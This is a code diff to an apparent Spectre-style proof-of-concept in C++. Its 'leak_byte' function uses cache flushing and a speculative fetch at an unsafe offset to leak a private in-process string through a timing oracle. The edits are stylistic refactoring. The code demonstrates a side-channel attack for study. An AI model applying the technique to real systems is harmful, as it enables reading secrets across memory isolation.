@@ -14,7 +14,7 @@
  * limitations under the License.
  */
 
-// TODO(asteinhauser) Deflake on ARM.
+// TODO(asteinha): Deflake on ARM.
 
 #include <algorithm>
 #include <array>
@@ -80,11 +80,12 @@ static char leak_byte(const char *data, size_t offset) {
       // Only when i is at the local_pointer_offset it assigns the unsafe
       // offset to the local_offset.
       local_offset =
-          offset + (safe_offset - offset) * (bool)(i - local_pointer_index);
+          offset + (safe_offset - offset) * static_cast<bool>(
+              i - local_pointer_index);
 
       // We always flush the pointer, so that its access is slower.
-      CLFlush(&*array_of_pointers);
       CLFlush(&(*array_of_pointers)[i]);
+      CLFlush(array_of_pointers.get());
 
       // When i is at the local_pointer_index, we slowly copy safe_offset into
       // the local_offset. Otherwise we just copy the safe_offset to junk. After
@@ -94,7 +95,7 @@ static char leak_byte(const char *data, size_t offset) {
       // Speculative fetch at the local_offset. Architecturally it fetches
       // always at the safe_offset, though speculatively it prefetches the
       // unsafe offset when i is at the local_pointer_index.
-      ForceRead(&isolated_oracle[(size_t)(data[local_offset])]);
+      ForceRead(&isolated_oracle[static_cast<size_t>(data[local_offset])]);
     }
 
     std::pair<bool, char> result =
@@ -110,7 +111,7 @@ static char leak_byte(const char *data, size_t offset) {
   }
 }
 
-int main(int argc, char **argv) {
+int main() {
   std::cout << "Leaking the string: ";
   std::cout.flush();
   const size_t private_offset = private_data - public_data;
